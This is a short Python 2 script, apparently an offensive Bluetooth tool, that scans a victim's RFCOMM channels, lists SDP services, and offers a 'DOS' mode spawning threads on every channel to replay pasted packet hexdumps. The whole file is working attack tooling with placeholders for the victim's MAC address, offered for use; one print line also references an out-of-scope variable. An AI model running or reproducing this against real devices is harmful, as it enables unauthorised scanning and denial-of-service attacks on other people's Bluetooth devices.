import sys
import bluetooth
from scapy.all import *
import binascii
from time import sleep
from threading import Thread

class mythread(Thread):
	def __init__(self,i):
		Thread.__init__(self)
		self.h=i

	def run(self):
		mac='' #Victim MAC Address
		s = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
		try:
			s.connect((mac,self.h))
			pkts=['',''] #Paste wireshark hexdump of packets
			for pkt in pkts:
				pkt = binascii.unhexlify(pkt)
				print pkt
				print "Trying {}".format(i)
				s.send(pkt)
		except:
			pass

def sdpBrowse(addr):
    services = bluetooth.find_service(address=addr)
    for service in services:
        name = service['name']
        proto = service['protocol']
        port = str(service['port'])
        print('[+] Found ' + str(name)+' on '+ str(proto) + ':'+port)

def scan(addr,port):
	sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
	try:
		sock.connect((addr,port))
		print "{} is open".format(str(port))
		sock.close()
	except:
		pass

if __name__=="__main__":
	print '''
   ___    _____    ___      ___  
  | _ )  |_   _|  | _ \    | __| 
  | _ \    | |    |   /    | _|  
  |___/   _|_|_   |_|_\   _|_|_  
_|"""""|_|"""""|_|"""""|_| """ | 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
				By 0xn41k & MrR3boot
'''
	print "[+] 1. Scan RFCOMM Ports"
	print "[+] 2. Identify Services"
	print "[+] 3. DOS"
	input = raw_input("> ")
	if input == "1":
		for i in range(1,65535):
			scan('',i) #Provide Victim's MAC Address
	elif input == "2":
		mac='' #Provide Victim's MAC Address
		sdpBrowse(mac)
	elif input == "3":
		print "[-] Depends on the design it may not work in all cases"
		for i in range(1,65535):
			t1 = mythread(i)
			t1.start()
	else:
		sys.exit()
